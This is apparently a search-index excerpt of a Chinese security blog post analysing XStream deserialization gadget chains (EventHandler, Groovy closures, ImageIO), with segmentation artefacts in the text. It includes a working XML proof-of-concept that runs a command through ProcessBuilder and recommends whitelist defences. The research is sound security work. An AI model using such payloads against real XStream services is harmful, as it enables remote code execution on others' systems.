\u65b9\u5f0f \u6765 \u8bbe\u7f6e \u9ed8\u8ba4 \u7684 \u540d\u5355 \u767d\u540d\u5355 \uff0c \u4f46\u662f \u8fd9\u4e2a \u7248\u672c \u628a \u4e0a\u9762   EventHandler   \u7684 \u9650\u5236 \u53bb\u6389 \u4e86 \uff0c \u5bfc\u81f4 \u53c8 \u53ef\u4ee5 \u4f7f\u7528 \u6700\u65e9 \u7684 POC \uff0c \u9700\u8981 \u6ce8\u610f \u7684 \u662f \u8fd9 \u662f \u6ca1 \u4fee\u8865 \u524d \u7684   1.4 . 10   \uff0c \u4fee\u590d \u540e \u5df2\u7ecf \u4e0d \u53ef\u4ee5 \u4e86   \u9664\u4e86 \u65b0\u589e \u8bbe\u7f6e \u540d\u5355 \u767d\u540d\u5355 \u7684 \u65b9\u5f0f \uff0c \u4e5f \u65b0 \u589e\u52a0 \u4e86   InternalBlackList   \u8fd9\u4e2a converter \uff0c \u4ed6 \u8bbe\u7f6e \u7684 \u6743\u9650 \u4e3a   LOW   \uff0c \u800c   ReflectionConverter   \u6743\u9650 \u4e3a   Very _ low   \uff0c \u6240\u4ee5 \u4f1a \u5148\u8fc7 \u4e00\u6b21 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u68c0\u67e5 \uff08 XStream \u5728 \u6ce8\u518c converters \u65f6 \uff0c \u4ee5 \u6743\u9650 \u7684 \u65b9\u5f0f \u6765 \u51b3\u5b9a \u6b21\u5e8f \uff09 \u3002   \u6240\u4ee5 \u8fd9\u91cc 1 , 4 , 5 \u90fd \u8dea \u4e86 \uff0c \u53ea \u5269\u4e0b groovy \u8fd9\u79cd \u4e86 \uff0c \u5f53\u7136 \u80af\u5b9a \u8fd8\u6709 \u5176\u4ed6 \u6ca1\u6709 \u53d1\u73b0 \u7684 \u5229\u7528 \u94fe \uff0c \u6240\u4ee5 \u6700 \u5b89\u5168 \u7684 \u65b9\u6cd5 \u8fd8\u662f \u4f7f\u7528 \u540d\u5355 \u767d\u540d\u5355 \u7684 \u65b9\u5f0f \uff0c \u4e0d\u80fd \u4f9d\u8d56 XStream \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u6765 \u505a \u5b89\u5168 \u9632\u5fa1 \u3002   0x04   \u603b\u7ed3   \u672c\u6587 \u4e3b\u8981 \u56de\u987e \u4e86 \u73b0\u6709 \u7684 \u4e00\u4e9b \u5229\u7528 \u94fe \uff0c \u503c\u5f97 \u6ce8\u610f \u503c\u5f97\u6ce8\u610f \u7684 \u662f \uff1a   \u5982\u679c XStream \u7528 \u7684 \u4e0d\u662f \u540d\u5355 \u767d\u540d\u5355 \u6a21\u5f0f \uff0c \u8fd8\u662f \u5b58\u5728 \u5229\u7528 \u7684 \u53ef\u80fd \u53ef\u80fd\u6027 \u7684 \u3002 \u73b0\u6709 \u5185\u7f6e \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u53ea \u7981\u6b62 \u4e86 \u51e0\u4e2a \u73b0\u6709 \u7684 \u5229\u7528 \u94fe \uff0c \u6211\u4eec \u8fd8\u662f \u53ef\u4ee5 \u627e\u5230 \u5176\u4ed6 \u53ef\u4ee5 \u5229\u7528 \u7684 \u5229\u7528 \u94fe \u7684 \uff0c \u6bd4\u5982 \u524d\u9762 \u63d0\u5230 \u7684 Groovy \u7684 \u5229\u7528 \u94fe \u3002   \u9700\u8981 \u8bb0\u4f4f \u7684 \u662f XStream \u4ed6 \u7684 \u89e6\u53d1 \u65b9\u5f0f \u4f9d\u8d56 \u7684 \u662f HashMap \u3001 TreeSet \u8fd9\u79cd \u7c7b\u578b \u81ea\u52a8 \u8c03\u7528 \u7684   hashCode   \u3001   compareTo   \u4e32 \u8d77\u6765 \u7684 \uff0c \u540e\u7eed \u53ef\u4ee5 \u6ce8\u610f \u4e00\u4e0b \u8fd9\u79cd \u53ef\u80fd \u7684 \u8c03\u7528 \u94fe \u3002   PS \uff1a \u672c\u6587 \u63d0\u5230 \u7684 \u6240\u6709 POC \uff0c \u5df2\u7ecf \u66f4\u65b0 \u5230   GitHub   \u4e0a","title":"\u56de\u987e XStream \u53cd \u5e8f\u5217\u5316 \u6f0f\u6d1e"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#0x00","text":"XStream   \u4e5f \u662f \u4e00\u6b3e \u7528 \u7684 \u6bd4\u8f83 \u591a \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u7ec4\u4ef6 \uff0c \u53ef\u4ee5 \u5c06 object \u8f6c\u5316 \u4e3a XML \u5e76 \u80fd \u5b8c\u6574 \u7684 \u8fd8\u539f \u56de\u6765 \u3002 \u4ed6 \u4e5f \u66fe\u7ecf \u51fa\u73b0 \u8fc7\u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \uff0c \u672c\u6587 \u4e3b\u8981 \u6574\u7406 XStream \u76f8\u5173 \u7684 \u5b89\u5168 \u95ee\u9898 XD","title":"0x00   \u524d\u8a00"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#0x01","text":"XStream \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u548c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u4e3b\u8981 \u4f9d\u9760   toXML   \u51fd\u6570 \u548c   fromXML   \u51fd\u6570 \uff0c \u5982\u4e0b \u4ee3\u7801 \u6240\u793a   Person   person   =   new   Person   (   \" tom \"   ,   18   ) ;   XStream   xStream   =   new   XStream   ( ) ;   String   xml   =   xStream   .   toXML   (   person   ) ;   / /   object   to   xml   System   .   out   .   println   (   xml   ) ;   System   .   out   .   println   (   xStream   .   fromXML   (   xml   ) ) ;   / /   xml   to   object   / /   \u8f93\u51fa   / /   < objects . Person >   / /   < name > tom < / name >   / /   < age > 18 < / age >   / /   < / objects . Person >   / /   objects . Person @ 369f73a2   \u5173\u4e8e XStream \u7684 fromXML \u5206\u6790 \u770b   \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0   \uff0c XStream \u4f1a \u53bb \u8c03\u7528 \u4e0d\u540c \u7684 Converters \u6765 \u5904\u7406 \u8fd8\u539f \u7684 \u8fc7\u7a0b \u3002   XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u540c fastjson \u8fd9\u79cd \u4e0d \u4e00\u6837 \u7684 \u5730\u65b9 \u662f fastjson \u4f1a \u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u65f6\u5019 \u4e3b\u52a8 \u53bb \u8c03\u7528 getters \u548c setters \uff0c \u800c XStream \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d \u8d4b\u503c \u90fd \u6709 Java \u7684 \u53cd\u5c04 \u673a\u5236 \u6765 \u5b8c\u6210 \uff0c \u6240\u4ee5 \u5e76 \u6ca1\u6709 \u8fd9\u6837 \u4e3b\u52a8 \u8c03\u7528 \u7684 \u7279\u6027 \u3002   \u4f46\u662f \u8fd8\u6709 \u4e00\u79cd \u5229\u7528 \u65b9\u5f0f \uff0c \u56de\u60f3 \u4e00\u4e0b \uff0c \u5728 \u51e0\u6761 \u5e38\u89c4 \u7684 java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe\u4e0a \uff0c \u90fd \u5229\u7528 \u4e86   HashMap   \u3001   PriorityQueue   \u7b49 \u5bf9\u8c61 \uff08 key \u4e0d\u53ef \u91cd\u590d \u7b49 \u7279\u6027 \uff09 \u4f1a \u81ea\u52a8 \u53bb \u8c03\u7528   hashCode   \u3001   equal   \u3001   compareTo   \u7b49 \u8fd9\u79cd \u51fd\u6570 \u3002   \u4ee5 \u8fd9\u79cd \u60f3\u6cd5 \u6765\u770b XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u5f53 \u6211\u4eec \u5bf9 Map \u8fd9\u79cd \u7c7b\u578b \u7684 \u5bf9\u8c61 \u8fdb\u884c \u8fd8\u539f \u7684 \u65f6\u5019 \uff0c \u662f\u5426 \u4e5f \u540c\u6837 \u4f1a \u53bb \u8c03\u7528 \u4e0a\u9762 \u63d0\u5230 \u7684 \u51e0\u79cd \u51fd\u6570 \uff1f \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u770b \u51e0\u4e2a Converter \u7684 \u5904\u7406 \uff1a","title":"0x01   \u57fa\u7840\u77e5\u8bc6"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#1-mapconverter","text":"\u6765 \u770b\u770b \u9488\u5bf9 Map \u7c7b\u578b \u8fd8\u539f \u7684 Converter   com . thoughtworks . xstream . converters . collections . MapConverter # unmarshal   populateMap   \u51fd\u6570 \u4f1a \u53bb \u5904\u7406 \u540e\u7eed \u7684 \u503c \uff0c \u8fd9\u91cc \u6211\u4eec \u76f4\u63a5 \u6765\u770b \u5177\u4f53 put \u7684 \u5730\u65b9   com . thoughtworks . xstream . converters . collections . MapConverter # putCurrentEntryIntoMap   \u8fd9\u91cc target \u4f5c\u4e3a \u63a5\u6536 \u63a5\u6536\u8005 \uff0c \u4f1a \u8c03\u7528 Map \u7684 put \u51fd\u6570 \uff0c \u540e\u7eed \u5c31\u662f \u6211\u4eec \u719f\u6089 \u7684 \u5bf9 key \u8c03\u7528 hashCode \u51fd\u6570","title":"1 .   MapConverter"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#2-treesettreemapconverter","text":"\u8fd9\u91cc TreeSet \u548c TreeMap \u4e00\u8d77 \u8bb2 \uff0c \u56e0\u4e3a TreeSet \u672c\u8eab \u5c31\u662f \u4e00\u4e2a \u53ea\u7528 \u4e0a \u4e86 Key \u7684 TreeMap \uff1b TreeSetConverter \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5904\u7406 \u4e5f \u662f \u5148 \u8f6c\u5316 \u4e3a TreeMapConverter \u7684 \u65b9\u5f0f \u6765 \u4f18\u5148 \u8fd8\u539f TreeSet \u91cc \u7684 TreeMap \uff0c \u518d \u586b\u5145 \u5230 TreeSet \u91cc \u3002   \u4ece TreeSetConverter \u6765\u8bb2   \u4ece treeset \u4e2d \u53d6\u51fa field   treemap \u540e \uff0c \u53bb \u4e00\u6b65 \u8fdb\u4e00\u6b65 \u8c03\u7528 TreeMapConverter \u6765 \u8fd8\u539f TreeMap   com . thoughtworks . xstream . converters . collections . TreeMapConverter # populateTreeMap   \u8fd9\u91cc \u5148\u7528 soredMap \u6765 \u586b\u5145 \u9700\u8981 \u8fd8\u539f \u7684 Entry \uff0c \u540e\u7eed \u5c06 \u8c03\u7528   TreeMap . putAll   \u6700\u7ec8 \u4f1a \u8c03\u7528 \u5230   java . util . AbstractMap # putAll   \u8fd9\u91cc \u7684 put \u51fd\u6570 \u4e3a   TreeMap . put   , \u4e0d\u770b \u5177\u4f53 \u7684 \u4ee3\u7801 \u4e86 \uff0c \u4ed6 \u7684 \u4e3b\u8981 \u529f\u80fd \u5c31\u662f \u586b\u5145 \u6570\u636e \uff0c \u5e76\u4e14 \u5728 \u586b\u5145 \u65f6 \u5c06 \u4f1a \u6bd4\u8f83 \u5f53\u524d \u5b58\u5728 key \uff0c \u5982\u679c \u662f \u76f8\u540c \u7684 key \uff0c \u5219 \u66ff\u6362 \u539f\u6709 \u8001 \u7684 \u503c \u3002 \u8fd9\u4e2a \u8fc7\u7a0b \u4f1a \u53bb \u8c03\u7528 key \u7684   compareTo   \u51fd\u6570","title":"2 .   TreeSet / TreeMapConverter"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#3-dynamicproxyconverter","text":"\u8fd8 \u9700\u8981 \u63d0\u53ca \u7684 \u662f XStream \u8fd8 \u652f\u6301 \u5bf9 \u52a8\u6001 \u4ee3\u7406 \u7684 \u65b9\u5f0f \u8fdb\u884c \u8fd8\u539f   \u8fd9\u91cc \u7684 \u8fd8\u539f \u8fc7\u7a0b \u4e0d \u8bf4 \u4e86 \uff0c \u6211\u4eec \u4e3b\u8981 \u7684 \u5173\u6ce8 \u5173\u6ce8\u70b9 \u662f \u4f7f\u7528 Proxy \u52a8\u6001 \u4ee3\u7406 \uff0c \u6211\u4eec \u53ef\u4ee5 \u6269\u5c55 \u524d\u9762 \u4e24\u79cd \u7684 \u81ea\u52a8 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u7684 \u653b\u51fb \u653b\u51fb\u9762 \uff0c \u4e0b \u4e00\u7ae0 \u4f1a\u4e3e   EventHandler   \u7684 \u4f8b\u5b50","title":"3 .   DynamicProxyConverter"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#0x02","text":"\u7ed3\u5408 \u4e0a\u9762 \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6 \u4e2d \u63d0\u5230 \u7684 \u51e0\u4e2a Converter \uff0c \u6211\u4eec \u60f3\u8981 \u5229\u7528 XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684\u8bdd \uff0c \u5f97 \u53bb \u5145\u5206 \u5206\u5229 \u5229\u7528 \u5145\u5206\u5229\u7528 \u524d\u9762 \u63d0\u5230 \u7684 \u51e0\u4e2a \u4f1a \u81ea\u52a8 \u8c03\u7528 \u7684 \u51fd\u6570","title":"0x02   \u73b0\u6709 \u51e0\u79cd \u5229\u7528 \u5206\u6790"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#1-eventhandler","text":"XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7528 \u7684 \u6700 \u591a \u7684   EventHandler   \uff0c \u6765 \u770b\u770b \u4ed6 \u7684   invoke   \u51fd\u6570   \u4e3b\u8981 \u5b9e\u73b0 \u5728   invokeInternal   \u51fd\u6570 \u5185   \u9996\u5148 \u9700\u8981 \u5224\u65ad \u6b64\u65f6 \u8c03\u7528 \u7684 \u51fd\u6570 \u662f\u5426 \u4e3a   hashCode   \u3001   equals   \u3001   toString   \uff0c \u5982\u679c \u662f \u7684\u8bdd \uff0c \u91c7\u7528 \u4ee5\u4e0b \u7684 \u65b9\u5f0f \u6765 \u5904\u7406 \u3002   \u4f46\u662f \u6211\u4eec \u9700\u8981 \u5229\u7528 \u7684 \u662f   invokeInternal   \u51fd\u6570 \u540e\u7eed \u7684 \u90e8\u5206 \uff0c \u6240\u4ee5 \u6211\u4eec \u5229\u7528 \u7684 \u65f6\u5019 \u4e0d\u80fd \u7528 \u5b83 \u6765 \u8c03\u7528 \u4e0a\u9762 \u7684 3 \u4e2a \u51fd\u6570 \uff0c   \u610f\u5473 \u610f\u5473\u7740 \u6211 \u524d\u9762 \u63d0\u5230 \u7684   Map   \u7684 \u65b9\u5f0f \uff0c \u4e0d \u9002\u5408 \u7528 \u5728 \u8fd9\u4e2a \u5730\u65b9   \uff1b \u800c   TreeSet   \u8fd9\u79cd \u8c03\u7528   compareTo   \u51fd\u6570 \uff0c \u53ef\u4ee5 \u7528\u6765 \u7ee7\u7eed \u5f80\u4e0b \u4e0b\u8d70 \u5f80\u4e0b\u8d70 \u3002   \u7ee7\u7eed \u5f80\u4e0b \u770b   \u540e\u7eed \u7684 \u5c31\u662f \u7ecf\u5178 \u7684 java \u53cd\u5c04 \u673a\u5236 \u6765 \u5b9e\u73b0 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \uff0c \u5e76\u4e14 \u8fd9\u91cc \u7684 target \u548c action \u90fd \u662f \u53ef\u63a7 \u7684 \u3002   \u8fd9\u91cc \u9700\u8981 \u6ce8\u610f \u4e00\u4e2a \u95ee\u9898 \u662f \uff0c \u8fd9\u91cc action \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u662f \u6709 \u8981\u6c42 \u7684 \uff08 \u770b 452 \u884c\u5230 461 \u884c \uff09   \u65e0 \u53c2\u6570   \u5355\u4e2a \u53c2\u6570 \uff0c \u4e14 \u53c2\u6570 \u7684 \u7c7b\u578b \u4e3a   Comparable   \uff0c \u5e76\u4e14 \u8fd9\u4e2a action \u51fd\u6570 \u662f \u53ef \u5229\u7528 \u7684   \u7b2c 2 \u79cd \u8fd8 \u6ca1\u6709 \u627e\u5230 \u8fd9\u6837 \u53ef \u5229\u7528 \u7684 \u51fd\u6570 \uff0c \u8fd9\u91cc \u7684 \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u53ef\u4ee5 \u63d0 \u4e24\u79cd \uff1a   \u914d\u7f6e \u597d cmd \u7684   ProcessBuilder   \uff0c action \u586b   start   \u914d\u7f6e \u597d rmi   url \u7684   JdbcRowSetImpl   \uff0c action \u586b   getDatabaseMetaData   \uff0c \u8fd9\u91cc \u53ef\u4ee5 \u4e3e\u4e00\u53cd\u4e09 \uff0c \u4e3b\u8981 \u601d\u8def \u5c31\u662f \u53ef \u5229\u7528 \u7684 getters   \u73b0\u5728 \u518d \u6765 \u770b\u770b \u5177\u4f53 \u7684   POC   < sorted - set >   < string >   foo   < / string >   < dynamic - proxy >   < ! --   Proxy   \u52a8\u6001 \u4ee3\u7406 \uff0c handler \u4f7f\u7528 EventHandler   -- >   < interface >   java . lang . Comparable   < / interface >   < handler   class =   \" java . beans . EventHandler \"   >   < target   class =   \" java . lang . ProcessBuilder \"   >   < command >   < string >   open   < / string >   < string >   / System / Applications / Calculator . app   < / string >   < / command >   < / target >   < action >   start   < / action >   < / handler >   < / dynamic - proxy >   < / sorted - set >","title":"1 .   EventHandler"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#2-groovy-convertedclosure","text":"\u5229\u7528 \u6761\u4ef6   \uff1a groovy   < =   2.4 . 3 \uff0c \u5728 \u540e\u7eed \u7684 \u7248\u672c \u91cc \uff0c   MethodClosure   \u4e0d \u5141\u8bb8 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8c03\u7528 \u3002   \u9664\u4e86 \u4e0a\u9762 \u8fd9\u79cd   EventHandler   \u7684 \u52a8\u6001 \u4ee3\u7406 \u65b9\u5f0f \uff0c Groovy \u7684   ConvertedClosure   \u4e5f \u540c\u6837 \u53ef\u4ee5 \u8fbe\u5230 \u8fd9\u79cd \u6548\u679c","title":"2 .   Groovy   ConvertedClosure"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#methodclosure","text":"\u5f53\u524d MethodClosure \u7684 \u4e3b\u8981 \u4f5c\u7528 \u5c31\u662f \u5c01\u88c5 \u6211\u4eec \u9700\u8981 \u6267\u884c \u7684 \u5bf9\u8c61 \uff0c \u6bd4\u5982   new   MethodClosure   (   Runtime   .   getRuntime   ( ) ,   \" exec \"   ) ;   \u5c01\u88c5   Runtime   \u5bf9\u8c61 \uff0c \u5e76 \u8bbe\u5b9a \u540e\u7eed \u9700\u8981 \u8c03\u7528 \u7684 \u51fd\u6570   exec","title":"MethodClosure"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#convertedclosure","text":"\u8fd9\u4e2a   ConvertedClosure   \u4e5f \u662f \u7ee7\u627f \u4e86   InvocationHandler   \uff0c \u53ef\u4ee5 \u5728 \u52a8\u6001 \u4ee3\u7406 \u4e2d \u4f5c\u4e3a handler \u7684 \u5b58\u5728 \uff0c \u6765\u770b \u4e00\u4e0b \u4ed6 \u7684 invoke   ConvertedClosure   \u8c03\u7528 \u7684 \u662f \u7236\u7c7b   org . codehaus . groovy . runtime . ConversionHandler # invoke   \u4e3b\u8981 \u770b \u8fd9\u4e2a \u90e8\u5206 \uff0c \u5bf9\u4e8e \u5f53\u524d \u8c03\u7528 \u7684 \u51fd\u6570 \uff0c \u5982\u679c \u975e Object \u7684 \u51fd\u6570 ( \u5982 toString \u3001 hashCode \u7b49 ) \uff0c \u5e76\u4e14 \u4e0d\u662f   GroovyObject   \u7684 \u51fd\u6570 \uff0c \u4f1a \u53bb \u8c03\u7528 \u5b50\u7c7b \u7684   invokeCustom   \uff0c \u8fd9\u91cc \u770b   org . codehaus . groovy . runtime . ConvertedClosure # invokeCustom   \u8fd9\u91cc \u7684 \u5c5e\u6027 \u90fd \u662f \u53ef\u63a7 \u7684 \uff0c \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u53ef\u4ee5 \u53bb \u8c03\u7528 \u53bb \u8c03\u7528 \u524d\u9762 \u6784\u9020 \u597d \u7684   MethodClosure   \uff0c \u8fd9\u91cc \u540e\u7eed \u8c03\u7528   call   \u7684 \u8fc7\u7a0b \u53ef\u4ee5 \u770b \u6700\u8fd1 \u7684 \u8fd9\u7bc7   \u6587\u7ae0   \u6240\u4ee5 \u4e3a\u4e86 \u6ee1\u8db3 \u80fd \u8c03\u7528   invokeCustom   \u51fd\u6570 \uff0c \u524d\u9762 \u7684 \u4e24\u79cd   MapConverter   \u548c   TreeSetConverter   \uff0c \u9009 \u54ea\u79cd \u5462 \uff1f   \u5f88 \u660e\u663e \u7b54\u6848 \u662f \u9009\u62e9   TreeSetConverter   \uff0c \u56e0\u4e3a   Map   \u4f1a \u53bb \u8c03\u7528   hashCode   \uff0c \u800c   TreeSet   \u4f1a \u53bb \u8c03\u7528   compareTo   \uff0c \u8fd9\u91cc \u7684   hashCode   \u662f Object \u7684 \u51fd\u6570 \uff0c \u8fc7 \u4e0d\u4e86 \u4e0a\u9762   checkMethod   \uff0c \u5177\u4f53 \u600e\u4e48 \u5199 POC \uff0c \u4e0d \u8be6\u7ec6 \u8bf4 \u4e86 \uff0c \u89c1   ysomap   PS \uff1a \u8fd9\u91cc \u9700\u8981 \u63d0 \u4e00\u4e0b \u7684 \u662f \u7531\u4e8e   compareTo   \u4f1a \u5e26\u4e0a \u4e00\u4e2a \u53c2\u6570 \uff0c \u6240\u4ee5 \u6211\u4eec   MethodClosure   \u5c01\u88c5 \u7684 \u540e\u7eed \u9700\u8981 \u8c03\u7528 \u7684 \u51fd\u6570 \u5fc5\u987b \u8981 \u5b58\u5728 \u4e00\u4e2a String \u7c7b\u578b \u7684 \u53c2\u6570 \uff0c \u4e0d\u7136 \u4f1a \u627e \u4e0d\u5230 \u51fd\u6570 \u62a5\u9519 \u3002 \uff08 \u53ef\u80fd \u8fd8\u6709 \u5176\u4ed6 \u7684 \u89e3\u51b3 \u65b9\u6cd5 \uff0c \u8fd9\u91cc \u6211 \u6ca1 \u7ee7\u7eed \u6df1\u5165 \u4e0b\u53bb \u4e86 \uff0c \u76f4\u63a5 \u6784\u9020   Runtime . exec   \u53ef\u4ee5 \u89e3\u51b3 \u8fd9\u4e2a \u95ee\u9898 \uff09","title":"ConvertedClosure"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#3-groovy-expando","text":"\u524d\u9762 \u7528\u5230 \u4e86   TreeSet   \u7684 \u65b9\u5f0f \uff0c \u8fd9\u91cc \u6211\u4eec \u53bb \u4f7f\u7528   Map   \u7684 \u7c7b\u578b \u6765 \u89e6\u53d1 \u3002 \u4ee5   Map   \u7684 \u7c7b\u578b \u6765 \u89e6\u53d1 \uff0c \u90a3 \u5c31\u662f \u627e \u53ef\u4ee5 \u5229\u7528 \u7684   hashCode   \u51fd\u6570   groovy . util . Expando # hashCode   \u5982\u679c \u5728 \u7c7b \u5c5e\u6027   expandoProperties   \u4e2d \u5b58\u5728   hashCode : methodclosure   \u7684 \u5185\u5bb9 \uff0c \u6211\u4eec \u53ef\u4ee5 \u5728 \u8fd9\u91cc \u76f4\u63a5 \u8c03\u7528   MethodClosure   \u7684   call   \u51fd\u6570 \uff0c \u8ddf \u4e0a\u9762   ConvertedClosure   \u540e\u7eed \u7684 \u8c03\u7528 \u4e00\u6837 \uff0c \u4f46\u662f \u8fd9\u91cc \u8c03\u7528 \u65f6 \u6ca1\u6709 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u8fc7\u6765 \uff0c \u6240\u4ee5 \u8fd9\u91cc \u7684 \u601d\u8def \u662f   ProcessBuilder . start   \u6216\u8005 fastjson \u90a3\u79cd getters \u7684 \u5229\u7528 \uff0c \u89c1   POC","title":"3 .   Groovy   Expando"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#4-imageiocontainsfilter","text":"\u4e0a\u9762 \u4f7f\u7528 \u52a8\u6001 \u4ee3\u7406 \u7684 \u65b9\u5f0f \u5229\u7528 \u4e86   TreeSet   \u8c03\u7528 put \u65f6 \u89e6\u53d1 \u7684   compareTo   \uff0c \u800c \u8fd9\u91cc \u5229\u7528 \u7684 \u662f   HashMap   \u7c7b\u578b put \u65f6 \u8c03\u7528 \u7684   hashCode   \u51fd\u6570 \uff1b \u8fd9\u4e2a \u94fe \u76f8\u5bf9 \u6765\u8bf4 \u76f8\u5bf9\u6765\u8bf4 \u590d\u6742 \u4e00\u70b9 \uff0c \u6211\u4eec \u4e00\u70b9 \u4e00\u70b9 \u4e00\u70b9\u4e00\u70b9 \u6765\u8bf4 \uff08 \u53c2\u8003 marshalsec \u7684   ImageIO   \uff0c \u8fd9\u91cc \u5148\u819c \u4e00\u6ce2 \u5927\u4f6c \u7684 \u601d\u8def \uff0c \u540e\u6587\u4e3a \u987a\u52bf \u4e0b\u53bb \u8bb2\u4e0b\u53bb \u7684 \uff0c \u4e3b\u8981 \u76ee\u7684 \u662f \u5230\u8fbe   Iterator . next   \uff0c \u5b9e\u9645 \u6316\u6398 \u8fd9\u79cd \u94fe \u8fd8\u662f \u5f97 \u4ece \u540e \u5f80\u524d \u627e \uff09 \uff1a   \u4ece XStream \u5904\u7406   Map   \u7c7b\u578b \u65f6 \u89e6\u53d1   hashCode   \u5f00\u59cb   \u5173\u6ce8   jdk . nashorn . internal . objects . NativeString # hashCode   \u540e\u7eed \u8c03\u7528   getStringValue   \u51fd\u6570 \uff0c \u5728 \u8fd9\u4e2a \u51fd\u6570 \u91cc \u53bb \u8c03\u7528 \u4e86   this . value . toString ( )   \uff0c \u8fd9\u91cc \u7684 value \u7684 \u7c7b\u578b \u4e3a   CharSequence   \uff0c \u6240\u4ee5 \u6211\u4eec \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u8981 \u627e \u53ef\u4ee5 \u5229\u7528 \u7684   CharSequence   \u7684 \u5b9e\u73b0 \u7c7b \uff0c \u8fd9\u91cc \u7528\u5230 \u7684 \u662f   com . sun . xml . internal . bind . v2 . runtime . unmarshaller . Base64Data # toString   \u51fd\u6570   \u8fd9\u91cc \u7d27\u63a5 \u63a5\u7740 \u7d27\u63a5\u7740 \u4f1a \u53bb \u8c03\u7528   ByteArrayOutputStreamEx   \u7684   readFrom   \uff0c \u8fd9\u4e2a \u51fd\u6570 \u7528\u5230 \u7684 \u4e3b\u8981 \u662f \u8fd9\u8fb9 \u4f20\u5165 \u7684 InputStream \u7684 read \u51fd\u6570   \u5b9e\u9645 \u5b9e\u9645\u4e0a   is   \u6211\u4eec \u662f \u53ef\u4ee5 \u63a7\u5236 \u7684 \uff0c \u56e0\u4e3a \u8fd9\u91cc \u8c03\u7528 \u7684   this . dataHandler . getDataSource ( ) . getInputStream ( )   \uff0c \u4ed6 \u7684 \u503c \u4f20\u9012 \u90fd \u53ef\u4ee5 \u7528\u7c7b \u5c5e\u6027 \u7684 \u65b9\u5f0f \u628a \u4ed6 \u6784\u5efa \u51fa\u6765 \uff0c \u5206\u522b \u662f   1 .   this . dataHandler   = =   \u6784\u9020 \u597d \u7684 DataHandler   2 .   DataHandler \u7684 dataSource \u5c5e\u6027   = =   \u6784\u9020 \u597d \u7684 XmlDataSource   3 .   XmlDataSource \u8c03\u7528 getInputStream ( ) \u51fd\u6570 \u8fd4\u56de \u6784\u9020 \u597d \u7684 inputStream   / /   com . sun . xml . internal . ws . encoding . xml . XMLMessage $ XmlDataSource   \u7528 \u8fd9\u79cd \u65b9\u6cd5 \u5c31 \u53ef\u4ee5 \u83b7\u53d6 \u4e00\u4e2a \u53ef\u63a7 \u7684   inputStream   \uff0c \u5e76\u4e14 \u540e\u7eed \u4f1a \u53bb \u8c03\u7528   read   \u51fd\u6570   \u7ee7\u7eed \u770b \u4e0b\u53bb \uff0c   javax . crypto . CipherInputStream # read   \u6b64\u65f6 \u9700\u8981 \u6784\u9020 \u4e00\u4e2a   Cipher   \u7c7b\u578b \uff0c \u5e76\u4e14 \u540e\u7eed \u8c03\u7528   Cipher . update   \u51fd\u6570 \uff0c \u8fd9\u91cc \u53ef\u4ee5 \u7528   javax . crypto . NullCipher   \u6765 \u586b\u5145 \uff0c \u56e0\u4e3a \u6700\u7ec8 \u7528\u5230 \u7684 \u662f \u7236\u7c7b   Cipher . update   \uff0c \u53ea\u8981 \u4e0d \u91cd\u8f7d   update   \uff0c \u5176\u4ed6 \u7684 \u5b50\u7c7b \u4e5f \u53ef\u4ee5 \u3002   \u7ee7\u7eed \u770b   Cipher . update   \u8bf4 \u4e86 \u90a3\u4e48 \u4e45 \uff0c \u6211\u4eec \u7ec8\u4e8e \u5230 \u4e86 \u81f3\u5173 \u91cd\u8981 \u81f3\u5173\u91cd\u8981 \u7684 \u4e00\u4e2a \u5730\u65b9 \uff0c   serviceIterator . next   \u51fd\u6570   \u540e\u7eed \u6211\u4eec \u5c06 \u8c03\u7528 ImageIO \u4e0b \u7684   javax . imageio . spi . FilterIterator # next   advance   \u51fd\u6570 \u4f1a \u53bb \u8c03\u7528   filter . filter   \u51fd\u6570 \uff0c \u800c ImageIO \u5b58\u5728 \u4e00\u4e2a \u6709\u8da3 \u7684 filter   javax . imageio . ImageIO . ContainsFilter # filter   \u6211\u4eec \u53ef\u4ee5 \u6307\u5b9a \u4e00\u4e2a Method \u5bf9\u8c61 \u53bb invoke \uff0c \u5230 \u4e86 \u8fd9\u91cc \u5c31\u662f \u6fc0\u52a8 